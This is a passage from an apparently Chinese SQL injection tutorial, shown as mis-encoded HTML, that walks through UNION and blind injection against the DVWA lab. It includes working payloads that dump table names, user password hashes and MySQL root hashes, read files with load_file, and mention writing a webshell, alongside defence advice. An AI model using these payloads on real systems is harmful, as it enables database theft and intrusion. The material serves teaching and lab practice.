@@datadir</p></li><li><p>æŸ¥è¯¢ç”¨æˆ·åï¼Œæ•°æ®åº“å  user()  database()</p></li><li><p>æ–‡ä»¶è¯»å– union select 1,load_file(â€˜C:\wondows\win.iniâ€™)#</p></li><li><p>å†™å…¥ webshell    select..into   outfileâ€¦</p></li><li><p>è¡¥å……ä¸€ç‚¹ï¼Œä½¿ç”¨ sql æ³¨å…¥é‡åˆ°è½¬ä¹‰å­—ç¬¦ä¸²çš„å•å¼•å·æˆ–è€…åŒå¼•å·ï¼Œå¯ä½¿ç”¨ HEX ç¼–</p></li></ul><p>ç ç»•è¿‡</p><h1 id="SQL-æ³¨å…¥å¸¸è§„åˆ©ç”¨æ€è·¯ï¼š"><a href="#SQL-æ³¨å…¥å¸¸è§„åˆ©ç”¨æ€è·¯ï¼š" class="headerlink" title="SQL æ³¨å…¥å¸¸è§„åˆ©ç”¨æ€è·¯ï¼š"></a>SQL æ³¨å…¥å¸¸è§„åˆ©ç”¨æ€è·¯ï¼š</h1><p>1ã€å¯»æ‰¾æ³¨å…¥ç‚¹ï¼Œå¯ä»¥é€šè¿‡ web æ‰«æå·¥å…·å®ç°</p><p>2ã€é€šè¿‡æ³¨å…¥ç‚¹ï¼Œå°è¯•è·å¾—å…³äºè¿æ¥æ•°æ®åº“ç”¨æˆ·åã€æ•°æ®åº“åç§°ã€è¿æ¥æ•°æ®åº“ç”¨</p><p>æˆ·æƒé™ã€æ“ä½œç³»ç»Ÿä¿¡æ¯ã€æ•°æ®åº“ç‰ˆæœ¬ç­‰ç›¸å…³ä¿¡æ¯ã€‚</p><p>3ã€çŒœè§£å…³é”®æ•°æ®åº“è¡¨åŠå…¶é‡è¦å­—æ®µä¸å†…å®¹ï¼ˆå¸¸è§å¦‚å­˜æ”¾ç®¡ç†å‘˜è´¦æˆ·çš„è¡¨åã€å­—</p><p>æ®µåç­‰ä¿¡æ¯ï¼‰</p><p>3.1 è¿˜å¯ä»¥è·å–æ•°æ®åº“çš„ root è´¦å· å¯†ç â€”æ€è·¯</p><p>4ã€å¯ä»¥é€šè¿‡è·å¾—çš„ç”¨æˆ·ä¿¡æ¯ï¼Œå¯»æ‰¾åå°ç™»å½•ã€‚</p><p>5ã€åˆ©ç”¨åå°æˆ–äº†è§£çš„è¿›ä¸€æ­¥ä¿¡æ¯</p><h1 id="æ‰‹å·¥æ³¨å…¥å¸¸è§„æ€è·¯ï¼š"><a href="#æ‰‹å·¥æ³¨å…¥å¸¸è§„æ€è·¯ï¼š" class="headerlink" title="æ‰‹å·¥æ³¨å…¥å¸¸è§„æ€è·¯ï¼š"></a>æ‰‹å·¥æ³¨å…¥å¸¸è§„æ€è·¯ï¼š</h1><p>1.åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³¨å…¥ï¼Œæ³¨å…¥æ˜¯å­—ç¬¦å‹è¿˜æ˜¯æ•°å­—å‹</p><p>2.çŒœè§£ SQL æŸ¥è¯¢è¯­å¥ä¸­çš„å­—æ®µæ•° order by N</p><p>3.ç¡®å®šæ˜¾ç¤ºçš„å­—æ®µé¡ºåº</p><p>4.è·å–å½“å‰æ•°æ®åº“</p><p>5.è·å–æ•°æ®åº“ä¸­çš„è¡¨</p><p>6.è·å–è¡¨ä¸­çš„å­—æ®µå</p><p>7.æŸ¥è¯¢åˆ°è´¦æˆ·çš„æ•°æ®</p><h1 id="SQL-è¯¦ç»†æ³¨å…¥è¿‡ç¨‹"><a href="#SQL-è¯¦ç»†æ³¨å…¥è¿‡ç¨‹" class="headerlink" title="SQL è¯¦ç»†æ³¨å…¥è¿‡ç¨‹"></a>SQL è¯¦ç»†æ³¨å…¥è¿‡ç¨‹</h1><p>çŒœæ•°æ®åº“ï¼š</p><p>1â€™ union select 1,database()</p><p>payload åˆ©ç”¨å¦ä¸€ç§æ–¹å¼ï¼š</p><p>1â€™ union select user(),database()</p><p>version()</p><p>å¾—åˆ°æ•°æ®åº“åï¼šdvwa</p><p>PSï¼šunion æŸ¥è¯¢ç»“åˆäº†ä¸¤ä¸ª select æŸ¥è¯¢ç»“æœï¼Œæ ¹æ®ä¸Šé¢çš„ order by è¯­å¥æˆ‘ä»¬çŸ¥é“</p><p>æŸ¥è¯¢åŒ…å«ä¸¤åˆ—ï¼Œä¸ºäº†èƒ½å¤Ÿç°å®ä¸¤åˆ—æŸ¥è¯¢ç»“æœï¼Œæˆ‘ä»¬éœ€è¦ç”¨ union æŸ¥è¯¢ç»“åˆæˆ‘ä»¬æ„</p><p>é€ çš„å¦å¤–ä¸€ä¸ª select.æ³¨æ„åœ¨ä½¿ç”¨ union æŸ¥è¯¢çš„æ—¶å€™éœ€è¦å’Œä¸»æŸ¥è¯¢çš„åˆ—æ•°ç›¸åŒã€‚</p><p>çŒœè¡¨åï¼š</p><p>1â€™ union select 1,group_concat(table_name) from information_schema.tables where</p><p>table_schema &#x3D;database()</p><p>å¾—åˆ°è¡¨åï¼šguestbook,users</p><p>group_concat åˆ†ç»„</p><p>çŒœåˆ—åï¼š</p><p>1â€™ union select 1,group_concat(column_name) from information_schema.columns</p><p>where table_name &#x3D;0x7573657273#</p><p>1â€™ union select 1,group_concat(column_name) from information_schema.columns</p><p>where table_name &#x3D;â€™usersâ€™#</p><p>(ç”¨ç¼–ç å°±ä¸ç”¨å•å¼•å·ï¼Œç”¨å•å¼•å·å°±ä¸ç”¨ç¼–ç )</p><p>å¾—åˆ°åˆ—ï¼š</p><p>user_id,first_name,last_name,user,password,avatar,last_login,failed_login,id,usernam</p><p>e,passwordçŒœç”¨æˆ·æ•°æ®ï¼š</p><p>åˆ—ä¸¾å‡ºå‡ ç§ payload:</p><p>1â€™ or 1&#x3D;1 union select</p><p>group_concat(user_id,first_name,last_name),group_concat(password) from users #</p><p>1â€™ union select null,concat_ws(char(32,58,32),user,password) from users #</p><p>1â€™ union select null,group_concat(concat_ws(char(32,58,32),user,password)) from</p><p>users #</p><p>å¾—åˆ°ç”¨æˆ·æ•°æ®ï¼š</p><p>admin 5f4dcc3b5aa765d61d8327deb882cf99</p><p>çŒœ root ç”¨æˆ·ï¼š#</p><p>1â€™ union select 1,group_concat(user,password) from mysql.user#</p><p>å¾—åˆ° root ç”¨æˆ·ä¿¡æ¯ï¼š</p><p>root*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B</p><h1 id="å¸¸ç”¨å‡½æ•°"><a href="#å¸¸ç”¨å‡½æ•°" class="headerlink" title="å¸¸ç”¨å‡½æ•°"></a>å¸¸ç”¨å‡½æ•°</h1><h2 id="SUBSTRING-å‡½æ•°"><a href="#SUBSTRING-å‡½æ•°" class="headerlink" title="SUBSTRING() å‡½æ•°"></a><code>SUBSTRING()</code> å‡½æ•°</h2><h3 id="åœ¨-SQL-æ³¨å…¥ä¸­çš„åº”ç”¨"><a href="#åœ¨-SQL-æ³¨å…¥ä¸­çš„åº”ç”¨" class="headerlink" title="åœ¨ SQL æ³¨å…¥ä¸­çš„åº”ç”¨"></a><strong>åœ¨ SQL æ³¨å…¥ä¸­çš„åº”ç”¨</strong></h3><p>åœ¨ SQL æ³¨å…¥æ”»å‡»ä¸­ï¼Œæ”»å‡»è€…ç»å¸¸ä½¿ç”¨ <code>SUBSTRING()</code> å‡½æ•°æ¥é€å­—ç¬¦æå–æ•°æ®åº“ä¸­çš„æ•°æ®ï¼Œå°¤å…¶æ˜¯åœ¨ç›²æ³¨åœºæ™¯ä¸­ã€‚ç›²æ³¨æ˜¯æŒ‡æ”»å‡»è€…æ— æ³•ç›´æ¥çœ‹åˆ°æŸ¥è¯¢ç»“æœï¼Œåªèƒ½é€šè¿‡é¡µé¢çš„å“åº”ï¼ˆå¦‚åŠ è½½æ—¶é—´ã€é”™è¯¯ä¿¡æ¯ç­‰ï¼‰æ¥åˆ¤æ–­æ³¨å…¥æ˜¯å¦æˆåŠŸã€‚</p><h4 id="æå–æ•°æ®åº“ä¸­çš„æ•°æ®"><a href="#æå–æ•°æ®åº“ä¸­çš„æ•°æ®" class="headerlink" title="æå–æ•°æ®åº“ä¸­çš„æ•°æ®"></a><strong>æå–æ•°æ®åº“ä¸­çš„æ•°æ®</strong></h4><p>å‡è®¾æ”»å‡»è€…æƒ³æå–æ•°æ®åº“ä¸­çš„ç”¨æˆ·åï¼Œå¯ä»¥ä½¿ç”¨ <code>SUBSTRING()</code> å‡½æ•°é€å­—ç¬¦æå–ã€‚ä¾‹å¦‚ï¼Œå‡è®¾ <code>users</code> è¡¨ä¸­æœ‰ <code>username</code> å­—æ®µï¼Œæ”»å‡»è€…å¯ä»¥æ„é€ å¦‚ä¸‹æ³¨å…¥è¯­å¥ï¼š</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; AND (SELECT SUBSTRING(username, 1, 1) FROM users LIMIT 1) = &#x27;</span>a<span class="string">&#x27;--</span></span><br></pre></td></tr></table></figure><ul><li><p>**<code>SUBSTRING(username, 1, 1)</code>**ï¼šæå– <code>username</code> å­—æ®µçš„ç¬¬ä¸€ä¸ªå­—ç¬¦ã€‚</p></li><li><p>**<code>LIMIT 1</code>**ï¼šé™åˆ¶åªæå–ç¬¬ä¸€ä¸ªç”¨æˆ·ã€‚</p></li><li><p>**<code>= &#39;a&#39;</code>**ï¼šåˆ¤æ–­æå–çš„å­—ç¬¦æ˜¯å¦ä¸º <code>&#39;a&#39;</code>ã€‚</p></li></ul><p>å¦‚æœé¡µé¢å“åº”æ­£å¸¸ï¼Œè¯´æ˜ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯ <code>&#39;a&#39;</code>ï¼›å¦‚æœé¡µé¢æ˜¾ç¤ºé”™è¯¯æˆ–åŠ è½½å¤±è´¥ï¼Œè¯´æ˜ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸æ˜¯ <code>&#39;a&#39;</code>ã€‚</p><p>æ”»å‡»è€…å¯ä»¥é€šè¿‡é€å­—ç¬¦å°è¯•ï¼Œé€æ­¥æå–å‡ºå®Œæ•´çš„ç”¨æˆ·åã€‚ä¾‹å¦‚ï¼š</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; AND (SELECT SUBSTRING(username, 2, 1) FROM users LIMIT 1) = &#x27;</span>l<span class="string">&#x27;--</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">AND</span> (<span class="keyword">SELECT</span> <span class="built_in">SUBSTRING</span>(username, <span class="number">3</span>, <span class="number">1</span>) <span class="keyword">FROM</span> users LIMIT <span class="number">1</span>) <span class="operator">=</span> <span class="string">&#x27;i&#x27;</span><span class="comment">--</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND (SELECT SUBSTRING(username, 4, 1) FROM users LIMIT 1) = &#x27;</span>c<span class="string">&#x27;--</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">AND</span> (<span class="keyword">SELECT</span> <span class="built_in">SUBSTRING</span>(username, <span class="number">5</span>, <span class="number">1</span>) <span class="keyword">FROM</span> users LIMIT <span class="number">1</span>) <span class="operator">=</span> <span class="string">&#x27;e&#x27;</span><span class="comment">--</span></span><br></pre></td></tr></table></figure><p>é€šè¿‡è¿™ç§æ–¹å¼ï¼Œæ”»å‡»è€…å¯ä»¥é€å­—ç¬¦æå–å‡ºå®Œæ•´çš„ç”¨æˆ·åã€‚</p><h3 id="3-ç¤ºä¾‹"><a href="#3-ç¤ºä¾‹" class="headerlink" title="3.Â ç¤ºä¾‹"></a>3.Â <strong>ç¤ºä¾‹</strong></h3><p>å‡è®¾æœ‰ä¸€ä¸ªç”¨æˆ·ç™»å½•é¡µé¢ï¼Œç”¨æˆ·è¾“å…¥çš„ç”¨æˆ·åå’Œå¯†ç ä¼šè¢«ç”¨äºä»¥ä¸‹ SQL æŸ¥è¯¢ï¼š</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;$username&#x27;</span> <span class="keyword">AND</span> password <span class="operator">=</span> <span class="string">&#x27;$password&#x27;</span></span><br></pre></td></tr></table></figure><p>æ”»å‡»è€…å¯ä»¥æ„é€ å¦‚ä¸‹æ³¨å…¥è¯­å¥ï¼š</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; AND (SELECT SUBSTRING(username, 1, 1) FROM users LIMIT 1) = &#x27;</span>a<span class="string">&#x27;--</span></span><br></pre></td></tr></table></figure><p>æ³¨å…¥åçš„æŸ¥è¯¢ï¼š</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">AND</span> (<span class="keyword">SELECT</span> <span class="built_in">SUBSTRING</span>(username, <span class="number">1</span>, <span class="number">1</span>) <span class="keyword">FROM</span> users LIMIT <span class="number">1</span>) <span class="operator">=</span> <span class="string">&#x27;a&#x27;</span><span class="comment">--</span></span><br></pre></td></tr></table></figure><ul><li><p>å¦‚æœé¡µé¢æ­£å¸¸åŠ è½½ï¼Œè¯´æ˜ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯ <code>&#39;a&#39;</code>ã€‚</p></li><li><p>å¦‚æœé¡µé¢æ˜¾ç¤ºé”™è¯¯æˆ–åŠ è½½å¤±è´¥ï¼Œè¯´æ˜ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸æ˜¯ <code>&#39;a&#39;</code>ã€‚</p></li></ul><p>æ”»å‡»è€…å¯ä»¥é€šè¿‡é€å­—ç¬¦å°è¯•ï¼Œé€æ­¥æå–å‡ºå®Œæ•´çš„ç”¨æˆ·åã€‚</p><h3 id="4-é˜²èŒƒæªæ–½"><a href="#4-é˜²èŒƒæªæ–½" class="headerlink" title="4.Â é˜²èŒƒæªæ–½"></a>4.Â <strong>é˜²èŒƒæªæ–½</strong></h3><p>ä¸ºäº†é¿å… SQL æ³¨å…¥æ”»å‡»ï¼Œå»ºè®®é‡‡å–ä»¥ä¸‹æªæ–½ï¼š</p><ul><li><p><strong>ä½¿ç”¨å‚æ•°åŒ–æŸ¥è¯¢</strong>ï¼šè¿™æ˜¯æœ€æœ‰æ•ˆçš„é˜²å¾¡æ–¹æ³•ã€‚é€šè¿‡å‚æ•°åŒ–æŸ¥è¯¢ï¼Œå¯ä»¥ç¡®ä¿ç”¨æˆ·è¾“å…¥ä¸ä¼šè¢«å½“ä½œ SQL ä»£ç æ‰§è¡Œã€‚</p></li><li><p><strong>è¾“å…¥éªŒè¯</strong>ï¼šå¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œä¸¥æ ¼çš„éªŒè¯ï¼Œç¡®ä¿è¾“å…¥ç¬¦åˆé¢„æœŸæ ¼å¼ã€‚</p></li><li><p><strong>æœ€å°æƒé™åŸåˆ™</strong>ï¼šé™åˆ¶æ•°æ®åº“ç”¨æˆ·çš„æƒé™ï¼Œåªæˆäºˆå¿…è¦çš„æƒé™ï¼Œé¿å…æ”»å‡»è€…è·å–è¿‡å¤šä¿¡æ¯ã€‚</p></li><li><p><strong>å¯ç”¨ WAFï¼ˆWeb åº”ç”¨é˜²ç«å¢™ï¼‰</strong>ï¼šWAF å¯ä»¥æ£€æµ‹å’Œé˜»æ­¢å¸¸è§çš„ SQL æ³¨å…¥æ”»å‡»ã€‚</p></li></ul><h1 id="1-5-UNIONè”åˆæ³¨å…¥"><a href="#1-5-UNIONè”åˆæ³¨å…¥" class="headerlink" title="1.5 UNIONè”åˆæ³¨å…¥"></a>1.5 UNIONè”åˆæ³¨å…¥</h1><h2 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h2><p>è”åˆæŸ¥è¯¢æ³¨å…¥æ˜¯è”åˆä¸¤ä¸ªè¡¨è¿›è¡Œæ³¨å…¥æ”»å‡»ï¼Œä½¿ç”¨å…³é”®è¯ union select å¯¹ä¸¤ä¸ªè¡¨è¿›</p><p>è¡Œè”åˆæŸ¥è¯¢ã€‚ä¸¤ä¸ªè¡¨çš„å­—æ®µè¦æ•°è¦ç›¸åŒï¼Œä¸ç„¶ä¼šå‡ºç°æŠ¥é”™ã€‚</p><p>guestbook è¡¨æœ‰ä¸‰ä¸ªå­—æ®µ</p><p>users æœ‰å…«ä¸ªå­—æ®µ</p><hr><p>å¦‚æœç›´æ¥è”åˆä¸¤ä¸ªè¡¨ å› ä¸ºåˆ—æ•°è·Ÿç¬¬ä¸€ä¸ªè¡¨ä¸ä¸€æ · ä¼šå¯¼è‡´å‡ºé”™æ•´åˆçš„è”åˆæŸ¥è¯¢æ–¹æ³•</p><p>SELECT * FROM guestbook WHERE comment_id&#x3D;1 union select 1,2,3 from users</p><p>guestbook æœ‰ä¸ªä¸‰ä¸ªå­—æ®µ users ä¹Ÿéœ€è¦æœ‰ä¸‰ä¸ªä¸ä¹‹åŒ¹é…</p><p>è¿™äº›æ•°å­—å¯ä»¥æ›¿æ¢æˆå­—æ®µçš„åç§°æˆ–è€…å‡½æ•°ã€‚</p><p>æ›¿æ¢æˆå‡½æ•°</p><p>SELECT * FROM guestbook WHERE comment_id&#x3D;1 union select</p><p>database(),user(),version() from userså­—æ®µæ›¿æ¢æˆå­—æ®µ</p><p>SELECT * FROM guestbook WHERE comment_id&#x3D;1 union select</p><p>user_id,user,password from users</p><hr><p>å¦‚æœæ²¡æœ‰åŠ ä¸Š limit é™å®šæ¡æ•°ä¼šæŠŠæ‰€æœ‰å†…å®¹æŸ¥è¯¢å‡ºæ¥ï¼Œæ‰€ä»¥éƒ½ä¼šåŠ ä¸Š limit 1 é™å®š</p><p>SELECT * FROM guestbook WHERE comment_id&#x3D;1 union select</p><p>user_id,user,password from users limit 1ä½†æ˜¯åªä¼šæ˜¾ç¤ºç¬¬ä¸€æ¡ï¼Œå› ä¸º SELECT * FROM guestbook WHERE comment_id&#x3D;1</p><p>è¿™ä¸ªè¯­å¥æ˜¯å­˜åœ¨è®°å½•çš„ å¦‚æœæƒ³è¦adminçš„å†…å®¹å¯ä»¥æŠŠ1æ¢æˆå…¶ä»–ä¸å­˜åœ¨çš„è®°å½•ï¼Œ</p><p>å› ä¸ºé»˜è®¤è´Ÿæ•°å°±è¡¨ç¤ºä¸å­˜åœ¨çš„ï¼Œæ‰€ä»¥å¯ä»¥åœ¨æ•°å­—å‰åŠ ä¸Š-1 å³å¯æ˜¾ç¤ºç¬¬äºŒä¸ªè¡¨çš„å†…</p><p>å®¹ã€‚</p><p>SELECT * FROM guestbook WHERE comment_id&#x3D;-1 union select</p><p>user_id,user,password from users limit 1</p><h2 id="æ³¨å…¥æ”»å‡»"><a href="#æ³¨å…¥æ”»å‡»" class="headerlink" title="æ³¨å…¥æ”»å‡»"></a>æ³¨å…¥æ”»å‡»</h2><h3 id="å‡½æ•°è¯´æ˜ï¼š"><a href="#å‡½æ•°è¯´æ˜ï¼š" class="headerlink" title="å‡½æ•°è¯´æ˜ï¼š"></a>å‡½æ•°è¯´æ˜ï¼š</h3><ul><li><code>GROUP_CONCAT(user,0x3a,password)</code> æ˜¯ä¸€ä¸ª SQL å‡½æ•°çš„ç”¨æ³•ï¼Œé€šå¸¸å‡ºç°åœ¨ SQL æŸ¥è¯¢ä¸­ï¼Œå°¤å…¶æ˜¯åœ¨æ¶‰åŠè”åˆæŸ¥è¯¢ï¼ˆå¦‚ SQL æ³¨å…¥æ”»å‡»ï¼‰çš„åœºæ™¯ä¸­ã€‚ä¸‹é¢æ¥è¯¦ç»†è§£é‡Šå®ƒçš„ä½œç”¨å’Œç”¨é€”ã€‚</li></ul><hr><h3 id="1-GROUP-CONCAT-å‡½æ•°"><a href="#1-GROUP-CONCAT-å‡½æ•°" class="headerlink" title="1.Â GROUP_CONCATÂ å‡½æ•°"></a>1.Â <strong><code>GROUP_CONCAT</code>Â å‡½æ•°</strong></h3><pre><code>`GROUP_CONCAT` æ˜¯ MySQL ä¸­çš„ä¸€ä¸ªèšåˆå‡½æ•°ï¼Œç”¨äºå°†å¤šè¡Œçš„æŸä¸ªå­—æ®µå€¼æ‹¼æ¥æˆä¸€ä¸ªå­—ç¬¦ä¸²ã€‚å®ƒçš„åŸºæœ¬è¯­æ³•æ˜¯ï¼š sql</code></pre><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">GROUP_CONCAT([<span class="keyword">DISTINCT</span>] expr [,expr ...]</span><br><span class="line">             [<span class="keyword">ORDER</span> <span class="keyword">BY</span> &#123;unsigned_integer <span class="operator">|</span> col_name <span class="operator">|</span> expr&#125;</span><br><span class="line">               [<span class="keyword">ASC</span> <span class="operator">|</span> <span class="keyword">DESC</span>] [,col_name ...]]</span><br><span class="line">             [SEPARATOR str_val])</span><br></pre></td></tr></table></figure><pre><code>- **`expr`**ï¼šè¦æ‹¼æ¥çš„å­—æ®µæˆ–è¡¨è¾¾å¼ã€‚- **`ORDER BY`**ï¼šå¯é€‰ï¼Œç”¨äºæŒ‡å®šæ‹¼æ¥æ—¶çš„æ’åºè§„åˆ™ã€‚- **`SEPARATOR`**ï¼šå¯é€‰ï¼Œé»˜è®¤æ˜¯é€—å·ï¼ˆ`,`ï¼‰ï¼Œç”¨äºæŒ‡å®šæ‹¼æ¥æ—¶çš„åˆ†éš”ç¬¦ã€‚ä¾‹å¦‚ï¼š</code></pre><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> GROUP_CONCAT(<span class="keyword">user</span> SEPARATOR <span class="string">&#x27;,&#x27;</span>) <span class="keyword">FROM</span> users;</span><br></pre></td></tr></table></figure><pre><code>è¿™æ¡ SQL ä¼šå°† `users` è¡¨ä¸­çš„æ‰€æœ‰ `user` å­—æ®µå€¼æ‹¼æ¥æˆä¸€ä¸ªä»¥é€—å·åˆ†éš”çš„å­—ç¬¦ä¸²ã€‚</code></pre><hr><h4 id="2-0x3a-çš„å«ä¹‰"><a href="#2-0x3a-çš„å«ä¹‰" class="headerlink" title="2.Â 0x3aÂ çš„å«ä¹‰"></a>2.Â <strong><code>0x3a</code>Â çš„å«ä¹‰</strong></h4><pre><code>åœ¨ SQL ä¸­ï¼Œ`0x3a` æ˜¯åå…­è¿›åˆ¶è¡¨ç¤ºçš„å†’å·ï¼ˆ`:`ï¼‰å­—ç¬¦ã€‚åœ¨ ASCII ç¼–ç ä¸­ï¼Œå†’å·çš„åå…­è¿›åˆ¶å€¼æ˜¯ `3A`ã€‚å› æ­¤ï¼Œ`0x3a` è¢«è§£é‡Šä¸ºä¸€ä¸ªå†’å·ï¼ˆ`:`ï¼‰ã€‚</code></pre><hr><h4 id="3-GROUP-CONCAT-user-0x3a-password-çš„ä½œç”¨"><a href="#3-GROUP-CONCAT-user-0x3a-password-çš„ä½œç”¨" class="headerlink" title="3.Â GROUP_CONCAT(user,0x3a,password)Â çš„ä½œç”¨"></a>3.Â <strong><code>GROUP_CONCAT(user,0x3a,password)</code>Â çš„ä½œç”¨</strong></h4><pre><code>`GROUP_CONCAT(user,0x3a,password)` çš„ä½œç”¨æ˜¯å°† `user` å’Œ `password` å­—æ®µçš„å€¼æ‹¼æ¥æˆä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œä¸­é—´ç”¨å†’å·ï¼ˆ`:`ï¼‰åˆ†éš”ã€‚å…·ä½“æ¥è¯´ï¼š- `user` æ˜¯ç¬¬ä¸€ä¸ªå­—æ®µå€¼ã€‚- `0x3a` è¢«è§£é‡Šä¸ºå†’å·ï¼ˆ`:`ï¼‰ã€‚- `password` æ˜¯ç¬¬äºŒä¸ªå­—æ®µå€¼ã€‚ä¾‹å¦‚ï¼Œå¦‚æœ `users` è¡¨ä¸­æœ‰ä»¥ä¸‹æ•°æ®ï¼š</code></pre><h6 id="è¡¨æ ¼"><a href="#è¡¨æ ¼" class="headerlink" title="è¡¨æ ¼"></a>è¡¨æ ¼</h6><table><thead><tr><th align="left">user</th><th align="left">password</th></tr></thead><tbody><tr><td align="left">alice</td><td align="left">pass123</td></tr><tr><td align="left">bob</td><td align="left">pass456</td></tr></tbody></table><pre><code>é‚£ä¹ˆ `GROUP_CONCAT(user,0x3a,password)` çš„ç»“æœå°†æ˜¯ï¼š`alice:pass123,bob:pass456`</code></pre><hr><h4 id="4-åœ¨-SQL-æ³¨å…¥ä¸­çš„ç”¨é€”"><a href="#4-åœ¨-SQL-æ³¨å…¥ä¸­çš„ç”¨é€”" class="headerlink" title="4.Â åœ¨ SQL æ³¨å…¥ä¸­çš„ç”¨é€”"></a>4.Â <strong>åœ¨ SQL æ³¨å…¥ä¸­çš„ç”¨é€”</strong></h4><pre><code>åœ¨ SQL æ³¨å…¥æ”»å‡»ä¸­ï¼Œæ”»å‡»è€…å¯èƒ½ä¼šåˆ©ç”¨ `GROUP_CONCAT` æ¥è·å–å¤šä¸ªå­—æ®µçš„å€¼ï¼Œä»¥ä¾¿ä¸€æ¬¡æ€§æå–æ›´å¤šæœ‰ç”¨ä¿¡æ¯ã€‚ä¾‹å¦‚ï¼š</code></pre><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> GROUP_CONCAT(<span class="keyword">user</span>,<span class="number">0x3a</span>,password) <span class="keyword">FROM</span> users;</span><br></pre></td></tr></table></figure><pre><code>è¿™æ¡ SQL ä¼šå°†æ‰€æœ‰ç”¨æˆ·çš„ç”¨æˆ·åå’Œå¯†ç æ‹¼æ¥æˆä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œä¸­é—´ç”¨å†’å·åˆ†éš”ï¼Œæ–¹ä¾¿æ”»å‡»è€…ä¸€æ¬¡æ€§è·å–æ‰€æœ‰ç”¨æˆ·ä¿¡æ¯ã€‚</code></pre><hr><h4 id="5-ç¤ºä¾‹-1"><a href="#5-ç¤ºä¾‹-1" class="headerlink" title="5.Â ç¤ºä¾‹"></a>5.Â <strong>ç¤ºä¾‹</strong></h4><pre><code>å‡è®¾æ”»å‡»è€…é€šè¿‡ SQL æ³¨å…¥æ”»å‡»ï¼Œæ„é€ äº†å¦‚ä¸‹æ¶æ„ SQLï¼š</code></pre><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; UNION SELECT GROUP_CONCAT(user,0x3a,password) FROM users--</span></span><br></pre></td></tr></table></figure><pre><code>è¿™æ¡ SQL çš„ä½œç”¨æ˜¯ï¼š1. **é—­åˆåŸå§‹ SQL è¯­å¥**ï¼š`-1&#39;` ç”¨äºé—­åˆåŸå§‹ SQL è¯­å¥ä¸­çš„å•å¼•å·ã€‚2. **è”åˆæŸ¥è¯¢**ï¼š`UNION SELECT` ç”¨äºå°†æ³¨å…¥çš„æŸ¥è¯¢ç»“æœä¸åŸå§‹æŸ¥è¯¢ç»“æœåˆå¹¶ã€‚3. **æå–ç”¨æˆ·ä¿¡æ¯**ï¼š`GROUP_CONCAT(user,0x3a,password)` å°† `users` è¡¨ä¸­çš„ç”¨æˆ·åå’Œå¯†ç æ‹¼æ¥æˆä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œæ–¹ä¾¿æ”»å‡»è€…è·å–ã€‚</code></pre><hr><h4 id="6-é˜²èŒƒæªæ–½-1"><a href="#6-é˜²èŒƒæªæ–½-1" class="headerlink" title="6.Â é˜²èŒƒæªæ–½"></a>6.Â <strong>é˜²èŒƒæªæ–½</strong></h4><pre><code>ä¸ºäº†é¿å… SQL æ³¨å…¥æ”»å‡»ï¼Œå»ºè®®é‡‡å–ä»¥ä¸‹æªæ–½ï¼š- **ä½¿ç”¨å‚æ•°åŒ–æŸ¥è¯¢**ï¼šè¿™æ˜¯æœ€æœ‰æ•ˆçš„é˜²å¾¡æ–¹æ³•ã€‚é€šè¿‡å‚æ•°åŒ–æŸ¥è¯¢ï¼Œå¯ä»¥ç¡®ä¿ç”¨æˆ·è¾“å…¥ä¸ä¼šè¢«å½“ä½œ SQL ä»£ç æ‰§è¡Œã€‚- **è¾“å…¥éªŒè¯**ï¼šå¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œä¸¥æ ¼çš„éªŒè¯ï¼Œç¡®ä¿è¾“å…¥ç¬¦åˆé¢„æœŸæ ¼å¼ã€‚- **æœ€å°æƒé™åŸåˆ™**ï¼šé™åˆ¶æ•°æ®åº“ç”¨æˆ·çš„æƒé™ï¼Œåªæˆäºˆå¿…è¦çš„æƒé™ï¼Œé¿å…æ”»å‡»è€…è·å–è¿‡å¤šä¿¡æ¯ã€‚- **å¯ç”¨ WAFï¼ˆWeb åº”ç”¨é˜²ç«å¢™ï¼‰**ï¼šWAF å¯ä»¥æ£€æµ‹å’Œé˜»æ­¢å¸¸è§çš„ SQL æ³¨å…¥æ”»å‡»ã€‚</code></pre><hr><h2 id="æ³¨å…¥"><a href="#æ³¨å…¥" class="headerlink" title="æ³¨å…¥"></a>æ³¨å…¥</h2><p>åœ¨ä¸Šé¢è¯¦ç»†çš„ä»‹ç»äº†åŸç†ï¼Œç°åœ¨å†æ¥åˆ†ææœ‰ SQL æ³¨å…¥æ¼æ´çš„ä»£ç ï¼Œé€šè¿‡åˆ†æä»£</p><p>ç ï¼Œæ›´æ·±å…¥åœ°äº†è§£ SQL æ³¨å…¥æ¼æ´ã€‚</p><p>ä½¿ç”¨$_REQUEST ç›´æ¥æ¥æ”¶ id å‚æ•°ï¼Œä¸”æ²¡æœ‰è¿›è¡Œè¿‡æ»¤ï¼Œä¸”å¯ä»¥æ¥æ”¶ cookie get post</p><p>è¿™äº›ä¼ é€’æ–¹æ³•ã€‚å½“ä¼ å…¥ 1 